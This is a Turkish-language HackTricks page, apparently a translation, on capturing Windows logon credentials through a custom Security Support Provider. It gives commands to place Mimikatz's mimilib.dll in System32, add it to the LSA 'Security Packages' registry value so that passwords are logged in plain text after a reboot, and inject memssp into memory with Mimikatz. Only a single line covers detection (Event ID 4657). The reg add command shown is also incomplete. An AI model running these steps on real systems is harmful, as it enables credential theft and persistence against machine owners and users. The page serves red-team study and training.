# Custom SSP

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

### Custom SSP

[SSP (Güvenlik Destek Sağlayıcısı) nedir burada öğrenin.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Makineye erişmek için kullanılan **kimlik bilgilerini** **düz metin** olarak **yakalamak** için **kendi SSP'nizi** oluşturabilirsiniz.

#### Mimilib

Mimikatz tarafından sağlanan `mimilib.dll` ikili dosyasını kullanabilirsiniz. **Bu, tüm kimlik bilgilerini düz metin olarak bir dosyaya kaydedecektir.**\
Dll'yi `C:\Windows\System32\` dizinine bırakın.\
Mevcut LSA Güvenlik Paketlerinin bir listesini alın:

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

`mimilib.dll` dosyasını Güvenlik Destek Sağlayıcıları listesine (Güvenlik Paketleri) ekleyin:
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Ve bir yeniden başlatmadan sonra tüm kimlik bilgileri `C:\Windows\System32\kiwissp.log` dosyasında düz metin olarak bulunabilir.

#### Bellekte

Bunu doğrudan belleğe Mimikatz kullanarak da enjekte edebilirsiniz (biraz kararsız/çalışmayabilir dikkat edin):
```powershell
privilege::debug
misc::memssp
```
Bu yeniden başlatmalara dayanmaz.

#### Hafifletme

Olay ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` oluşturma/değiştirme denetimi

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
